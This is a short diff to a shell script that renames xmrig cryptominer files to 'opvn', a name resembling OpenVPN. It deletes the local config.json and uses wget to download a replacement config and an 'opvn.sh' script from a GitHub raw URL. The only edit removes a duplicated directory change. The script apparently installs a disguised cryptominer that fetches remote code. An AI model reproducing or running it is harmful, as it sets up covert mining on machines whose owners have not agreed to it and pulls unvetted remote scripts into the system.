@@ -5,7 +5,6 @@ mv xmrig* opvn
 cd opvn/
 mv xmr* opvn
 
-cd opvn/
 rm -rf config.json
 wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json
 wget https://raw.githubusercontent.com/bondbenz1821/opme/main/opvn.sh
